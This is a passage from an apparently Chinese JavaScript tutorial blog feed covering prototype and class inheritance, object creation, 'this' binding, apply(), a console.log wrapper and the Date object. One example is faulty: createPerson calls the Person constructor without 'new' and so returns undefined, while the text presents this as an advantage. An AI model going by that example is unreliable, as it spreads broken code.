Person(...)</code>来构造对象时，JavaScript实际上参考的是<code>Person.prototype</code>指向的对象来生成<code>person1</code>。另一方面，<code>Person()</code>函数是<code>Person.prototype</code>的构造函数，也就是说<code>Person===Person.prototype.constructor</code>（不信的话可以试试）。–MDN</p></blockquote><p>最后，重写greeting函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Teacher.prototype.greeting = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> prefix;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">this</span>.gender === <span class="string">&#x27;male&#x27;</span> || <span class="built_in">this</span>.gender === <span class="string">&#x27;Male&#x27;</span> || <span class="built_in">this</span>.gender === <span class="string">&#x27;m&#x27;</span> || <span class="built_in">this</span>.gender === <span class="string">&#x27;M&#x27;</span>) &#123;</span><br><span class="line">    prefix = <span class="string">&#x27;Mr.&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">this</span>.gender === <span class="string">&#x27;female&#x27;</span> || <span class="built_in">this</span>.gender === <span class="string">&#x27;Female&#x27;</span> || <span class="built_in">this</span>.gender === <span class="string">&#x27;f&#x27;</span> || <span class="built_in">this</span>.gender === <span class="string">&#x27;F&#x27;</span>) &#123;</span><br><span class="line">    prefix = <span class="string">&#x27;Mrs.&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    prefix = <span class="string">&#x27;Mx.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  alert(<span class="string">&#x27;Hello. My name is &#x27;</span> + prefix + <span class="string">&#x27; &#x27;</span> + <span class="built_in">this</span>.name.last + <span class="string">&#x27;, and I teach &#x27;</span> + <span class="built_in">this</span>.subject + <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p><strong>注:</strong> 考虑到JavaScript的工作方式，由于原型链等特性的存在，在不同对象之间功能的共享通常被叫做 <strong>委托</strong> - 特殊的对象将功能委托给通用的对象类型完成。这也许比将其称之为继承更为贴切，因为“被继承”了的功能并没有被拷贝到正在“进行继承”的对象中，相反它仍存在于通用的对象中。–MDN</p></blockquote><h3 id="class继承"><a href="#class继承" class="headerlink" title="class继承"></a>class继承</h3><p>ES6引入了calss，简化了原型继承的代码量（继承原理不变）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">name, age</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">greeting</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        alert(<span class="string">&#x27;Hi! I\&#x27;m &#x27;</span> + <span class="built_in">this</span>.name.first + <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">extends</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">name, age, status</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(name, age);</span><br><span class="line">        <span class="built_in">this</span>.status = status;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="title">doHomework</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        alert(<span class="string">&#x27;我在做作业&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">s1 = <span class="keyword">new</span> Student(<span class="string">&#x27;manu&#x27;</span>,<span class="number">19</span>,<span class="string">&#x27;learn&#x27;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>注意兼容性再考虑是否使用class   </p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> JavaScript </category>
          
          <category> OOP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 继承 </tag>
            
            <tag> 原型 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript对象</title>
      <link href="/Front-end/JavaScript/%E5%AF%B9%E8%B1%A1.html"/>
      <url>/Front-end/JavaScript/%E5%AF%B9%E8%B1%A1.html</url>
      
        <content type="html"><![CDATA[<p>JavaScript的对象是一种无序的集合数据类型，它由若干键值对组成。</p><span id="more"></span><p>对象是一个包含相关数据和方法的集合，下面就是一个简单的对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">  <span class="attr">name</span> : [<span class="string">&#x27;Bob&#x27;</span>, <span class="string">&#x27;Smith&#x27;</span>], </span><br><span class="line">  <span class="attr">age</span> : <span class="number">32</span>,</span><br><span class="line">  <span class="attr">gender</span> : <span class="string">&#x27;male&#x27;</span>,</span><br><span class="line">  <span class="attr">interests</span> : [<span class="string">&#x27;music&#x27;</span>, <span class="string">&#x27;skiing&#x27;</span>],</span><br><span class="line">  <span class="attr">bio</span> : <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    alert(<span class="built_in">this</span>.name[<span class="number">0</span>] + <span class="string">&#x27; &#x27;</span> + <span class="built_in">this</span>.name[<span class="number">1</span>] + <span class="string">&#x27; is &#x27;</span> + <span class="built_in">this</span>.age + <span class="string">&#x27; years old. He likes &#x27;</span> + <span class="built_in">this</span>.interests[<span class="number">0</span>] + <span class="string">&#x27; and &#x27;</span> + <span class="built_in">this</span>.interests[<span class="number">1</span>] + <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">greeting</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    alert(<span class="string">&#x27;Hi! I\&#x27;m &#x27;</span> + <span class="built_in">this</span>.name[<span class="number">0</span>] + <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">  &#125;<span class="comment">//注意这里没有逗号</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>对象与值之间使用<code>:</code>隔开，对象里的string、number、array也叫对象的属性（property），对象里的函数也叫对象的方法（method），上面整个对象被称为对象的字面量（literal）</p><h2 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h2><h3 id="点表示法"><a href="#点表示法" class="headerlink" title="点表示法"></a>点表示法</h3><p>使用<code>.</code>来访问对象里的属性方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">person.name;</span><br><span class="line">person.age;</span><br></pre></td></tr></table></figure><p>对象也可以作为值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">name: &#123;</span><br><span class="line"><span class="attr">first</span>:<span class="string">&#x27;Bob&#x27;</span>,</span><br><span class="line"><span class="attr">last</span>:<span class="string">&#x27;Smith&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//访问</span></span><br><span class="line">person.name.first;</span><br></pre></td></tr></table></figure><h3 id="括号表示法"><a href="#括号表示法" class="headerlink" title="括号表示法"></a>括号表示法</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">person[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">person[<span class="string">&#x27;name&#x27;</span>];</span><br></pre></td></tr></table></figure><p>与数组有点类似，不同的是：对象是字符串到值的映射，数组是数字到值的映射</p><h2 id="设置值"><a href="#设置值" class="headerlink" title="设置值"></a>设置值</h2><p>通过访问的形式修改</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">person.age = <span class="number">19</span>;</span><br></pre></td></tr></table></figure><p>也可以新增一个属性或者函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">person.other = <span class="string">&#x27;other&#x27;</span>;</span><br><span class="line">person.fun = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="string">&#x27;hello world&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>括号表示法的优点就是可以动态的设置成员名字</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> dataName = <span class="string">&#x27;height&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> dataValue = <span class="string">&#x27;1.60cm&#x27;</span>;</span><br><span class="line">person[dataName] = dataValue;</span><br></pre></td></tr></table></figure><h2 id="构造函数与对象"><a href="#构造函数与对象" class="headerlink" title="构造函数与对象"></a>构造函数与对象</h2><p>JS不像java那样可以使用class来声明类，而是使用了<strong>构造函数</strong>的特殊函数来定义</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//简单定义</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createNewPerson</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line">  obj.name = name;</span><br><span class="line">  obj.greeting = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    alert(<span class="string">&#x27;Hi! I\&#x27;m &#x27;</span> + <span class="built_in">this</span>.name + <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//调用</span></span><br><span class="line"><span class="keyword">var</span> salva = createNewPerson(<span class="string">&#x27;salva&#x27;</span>);</span><br><span class="line">salva.name;</span><br><span class="line">salva.greeting();</span><br></pre></td></tr></table></figure><p>但这样定义有点不方便，因为创建一个空对象还要返回它，以下是一个便捷方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//名字注意大写，代表他是一个类（构造函数）</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.name = name;</span><br><span class="line">  <span class="built_in">this</span>.greeting = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    alert(<span class="string">&#x27;Hi! I\&#x27;m &#x27;</span> + <span class="built_in">this</span>.name + <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//调用,使用new就会返回对象</span></span><br><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> Person(<span class="string">&#x27;Bob&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> person2 = <span class="keyword">new</span> Person(<span class="string">&#x27;Sarah&#x27;</span>);</span><br></pre></td></tr></table></figure><blockquote><p>注意：引用使用new才是才代表使用构造函数，里面的this才会绑定当前对象，为此构造函数名规定大写</p></blockquote><h3 id="封装new"><a href="#封装new" class="headerlink" title="封装new"></a>封装new</h3><p>使用createPerson将new封装起来</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.name = props.name || <span class="string">&#x27;无名氏&#x27;</span>;</span><br><span class="line">  <span class="built_in">this</span>.age = props.age || <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">Person.prototype.greeting = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    alert(<span class="string">&#x27;Hi! I\&#x27;m &#x27;</span> + <span class="built_in">this</span>.name + <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createPerson</span>(<span class="params">props</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> Person(props || &#123;&#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 调用</span></span><br><span class="line"><span class="keyword">let</span> p1 = createPerson(&#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;muyang&#x27;</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>优点</p><ul><li>不需要new</li><li>参数灵活，可以无序，因为是对象</li></ul><h2 id="创建对象的其他方式"><a href="#创建对象的其他方式" class="headerlink" title="创建对象的其他方式"></a>创建对象的其他方式</h2><h3 id="Object"><a href="#Object" class="headerlink" title="Object()"></a>Object()</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> <span class="built_in">Object</span>();<span class="comment">/*这是一个空对象*/</span></span><br><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> <span class="built_in">Object</span>(&#123;</span><br><span class="line">  <span class="attr">name</span> : <span class="string">&#x27;Chris&#x27;</span>,</span><br><span class="line">  <span class="attr">age</span> : <span class="number">38</span>,</span><br><span class="line">  <span class="attr">greeting</span> : <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    alert(<span class="string">&#x27;Hi! I\&#x27;m &#x27;</span> + <span class="built_in">this</span>.name + <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);<span class="comment">/*这是一个有属性方法的对象*/</span></span><br></pre></td></tr></table></figure><h3 id="create"><a href="#create" class="headerlink" title="create()"></a>create()</h3><p>这个方法可以根据现有对象创建新的对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person2 = <span class="built_in">Object</span>.create(person1);</span><br></pre></td></tr></table></figure><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>对象里的函数叫方法，如</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xiaoming = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;小明&#x27;</span>,</span><br><span class="line">    <span class="attr">birth</span>: <span class="number">1990</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> y = <span class="keyword">new</span> <span class="built_in">Date</span>().getFullYear();</span><br><span class="line">        <span class="keyword">return</span> y - <span class="built_in">this</span>.birth;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="viewthis"><a href="#viewthis" class="headerlink" title="viewthis"></a>viewthis</h3><ul><li><p>是一个变量，代表当前对象</p></li><li><p>需要注意的是this在哪定义，调用形式是什么，如果使用xiaoming.age()调用的话this就代表xiaoming；如果函数在外面，如</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAge</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> y = <span class="keyword">new</span> <span class="built_in">Date</span>().getFullYear();</span><br><span class="line">    <span class="keyword">return</span> y - <span class="built_in">this</span>.birth;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> xiaoming = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;小明&#x27;</span>,</span><br><span class="line">    <span class="attr">birth</span>: <span class="number">1990</span>,</span><br><span class="line">    <span class="attr">age</span>: getAge</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>此时如果使用getAge()调用则会代表全局对象，会返回NaN，而且必须采用<code>xiaoming.age()</code>这个形式调用，就算赋值给变量也不行</p></li><li><p>如果是在对象方法内定义函数，里面的this也会变回全局对象</p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xiaoming = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;小明&#x27;</span>,</span><br><span class="line">    <span class="attr">birth</span>: <span class="number">1990</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">getAgeFromBirth</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> y = <span class="keyword">new</span> <span class="built_in">Date</span>().getFullYear();</span><br><span class="line">            <span class="keyword">return</span> y - <span class="built_in">this</span>.birth;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> getAgeFromBirth();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>​    此时使用xiaoming.age()也会返回NaN，解决方法就是将this变量存起来传递，或者使用apply()</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xiaoming = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;小明&#x27;</span>,</span><br><span class="line">    <span class="attr">birth</span>: <span class="number">1990</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> that = <span class="built_in">this</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">getAgeFromBirth</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> y = <span class="keyword">new</span> <span class="built_in">Date</span>().getFullYear();</span><br><span class="line">            <span class="keyword">return</span> y - that.birth;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> getAgeFromBirth();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>控制this指向，函数内有一个apply()方法，第一个参数就是this指向的对象，第二个参数是数组，里面对应函数的参数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAge</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> y = <span class="keyword">new</span> <span class="built_in">Date</span>().getFullYear();</span><br><span class="line">    <span class="keyword">return</span> y - <span class="built_in">this</span>.birth;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> xiaoming = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;小明&#x27;</span>,</span><br><span class="line">    <span class="attr">birth</span>: <span class="number">1990</span>,</span><br><span class="line">    <span class="attr">age</span>: getAge</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xiaoming.age(); <span class="comment">// 25</span></span><br><span class="line">getAge.apply(xiaoming, []); <span class="comment">// 25, this指向xiaoming, 参数为空</span></span><br></pre></td></tr></table></figure><h2 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h2><p>在不改变原有结构给函数添加新功能，下面给出一个示例</p><p>假如我想给console.log()添加功能：打印当前时间+内容，我可以这样做</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">oldConsoleLog  = <span class="built_in">console</span>.log;<span class="comment">/*保留原函数*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log = <span class="function"><span class="keyword">function</span> (<span class="params">arg</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> date = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">    <span class="keyword">return</span> oldConsoleLog(date+<span class="string">&#x27;\n&#x27;</span>+arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="标准对象"><a href="#标准对象" class="headerlink" title="标准对象"></a>标准对象</h2><p>经常会使用这些对象，如Date等等</p><h3 id="Date"><a href="#Date" class="headerlink" title="Date"></a>Date</h3><p>表示日期和时间</p><p>先来看看对象本身</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Date</span>()</span><br><span class="line">    <span class="attr">UTC</span>: <span class="function"><span class="keyword">function</span> <span class="title">UTC</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    <span class="title">length</span>: 7</span></span><br><span class="line"><span class="function">    <span class="title">name</span>: &quot;<span class="title">Date</span>&quot;</span></span><br><span class="line"><span class="function">    <span class="title">now</span>: <span class="function"><span class="keyword">function</span> <span class="title">now</span>(<span class="params"></span>)</span></span></span><br><span class="line"><span class="function"><span class="function">    <span class="title">parse</span>: <span class="function"><span class="keyword">function</span> <span class="title">parse</span>(<span class="params"></span>)</span></span></span></span><br></pre></td></tr></table></figure><ul><li>UTC：接收时间参数，返回1970年1月1日UTC 00:00:00（UNIX时间纪元）以来的毫秒数</li><li>now：返回当前时间从时间纪元以来的毫秒数</li><li>parse：可以接收字符串的时间，<a href="http://www.w3.org/TR/NOTE-datetime">ISO 8601</a>格式</li></ul><p>有了一点原型知识，再看一下他的prototype</p><figure class="highlight javascript"><figcaption><span>Date.prototype &gt;folded</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">prototype: &#123;…&#125;</span><br><span class="line">    <span class="attr">constructor</span>: <span class="function"><span class="keyword">function</span> <span class="title">Date</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    <span class="title">getDate</span>: <span class="function"><span class="keyword">function</span> <span class="title">getDate</span>(<span class="params"></span>)</span></span></span><br><span class="line"><span class="function"><span class="function">    <span class="title">getDay</span>: <span class="function"><span class="keyword">function</span> <span class="title">getDay</span>(<span class="params"></span>)</span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function">    <span class="title">getFullYear</span>: <span class="function"><span class="keyword">function</span> <span class="title">getFullYear</span>(<span class="params"></span>)</span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">getHours</span>: <span class="function"><span class="keyword">function</span> <span class="title">getHours</span>(<span class="params"></span>)</span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">getMilliseconds</span>: <span class="function"><span class="keyword">function</span> <span class="title">getMilliseconds</span>(<span class="params"></span>)</span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">getMinutes</span>: <span class="function"><span class="keyword">function</span> <span class="title">getMinutes</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">getMonth</span>: <span class="function"><span class="keyword">function</span> <span class="title">getMonth</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">getSeconds</span>: <span class="function"><span class="keyword">function</span> <span class="title">getSeconds</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">getTime</span>: <span class="function"><span class="keyword">function</span> <span class="title">getTime</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">getTimezoneOffset</span>: <span class="function"><span class="keyword">function</span> <span class="title">getTimezoneOffset</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">getUTCDate</span>: <span class="function"><span class="keyword">function</span> <span class="title">getUTCDate</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">getUTCDay</span>: <span class="function"><span class="keyword">function</span> <span class="title">getUTCDay</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">getUTCFullYear</span>: <span class="function"><span class="keyword">function</span> <span 